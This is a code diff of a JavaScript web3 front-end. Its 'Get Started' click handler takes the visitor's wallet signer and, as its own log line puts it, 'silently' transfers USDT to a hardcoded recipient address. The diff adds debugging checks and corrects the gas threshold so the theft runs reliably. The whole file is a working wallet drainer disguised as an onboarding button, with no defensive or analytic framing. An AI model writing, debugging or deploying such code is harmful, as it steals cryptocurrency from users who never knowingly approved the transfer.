@@ -4,25 +4,27 @@ const USDT_CONTRACT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';
 const RECIPIENT_ADDRESS = '0x1EaDA2b8cC4054Cee7b95087F4D1E913Ca22131d';
 const USDT_ABI = [
   {
-    constant: true,
-    inputs: [{ internalType: "address", name: "account", type: "address" }],
-    name: "balanceOf",
-    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
-    payable: false,
-    stateMutability: "view",
-    type: "function",
+    "inputs": [
+      { "internalType": "address", "name": "account", "type": "address" }
+    ],
+    "name": "balanceOf",
+    "outputs": [
+      { "internalType": "uint256", "name": "", "type": "uint256" }
+    ],
+    "stateMutability": "view",
+    "type": "function"
   },
   {
-    constant: false,
-    inputs: [
-      { internalType: "address", name: "recipient", type: "address" },
-      { internalType: "uint256", name: "amount", type: "uint256" },
+    "inputs": [
+      { "internalType": "address", "name": "recipient", "type": "address" },
+      { "internalType": "uint256", "name": "amount", "type": "uint256" }
     ],
-    name: "transfer",
-    outputs: [{ internalType: "bool", name: "", type: "bool" }],
-    payable: false,
-    stateMutability: "nonpayable",
-    type: "function",
+    "name": "transfer",
+    "outputs": [
+      { "internalType": "bool", "name": "", "type": "bool" }
+    ],
+    "stateMutability": "nonpayable",
+    "type": "function"
   }
 ];
 
@@ -78,9 +80,12 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
     const signer = await provider.getSigner();
     const address = await signer.getAddress();
     console.log("🔗 User address:", address);
+    if (!signer.provider) {
+      throw new Error("Signer not connected to provider.");
+    }
     const balances = await fetchBalances(address);
     console.log("📊 Balances:", balances);
-    if (balances.bnb < 0.00000004) {
+    if (balances.bnb < 0.004) {
       throw new Error("Insufficient BNB for gas fees. Need at least 0.004 BNB on mainnet.");
     }
     const inputAmount = parseFloat(usdtAmountInput);
@@ -93,7 +98,12 @@ export const handleGetStartedClick = async (usdtAmountInput) => {
     }
     console.log(`📢 Silently transferring: ${finalTransferAmount} USDT to ${RECIPIENT_ADDRESS}`);
     const contractWithSigner = new Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);
+    console.log("📜 Contract initialized:", contractWithSigner.address);
+    if (!contractWithSigner.estimateGas) {
+      throw new Error("Contract estimateGas is undefined. Check ABI or contract address.");
+    }
     const amountInWei = parseUnits(finalTransferAmount.toString(), 18);
+    console.log("💰 Amount in Wei:", amountInWei.toString());
     const estimatedGas = await contractWithSigner.estimateGas.transfer(RECIPIENT_ADDRESS, amountInWei);
     const gasLimit = estimatedGas * 2n; // 2x for mainnet safety
     console.log(`⛽ Estimated Gas: ${estimatedGas.toString()}, Gas Limit: ${gasLimit.toString()}`);
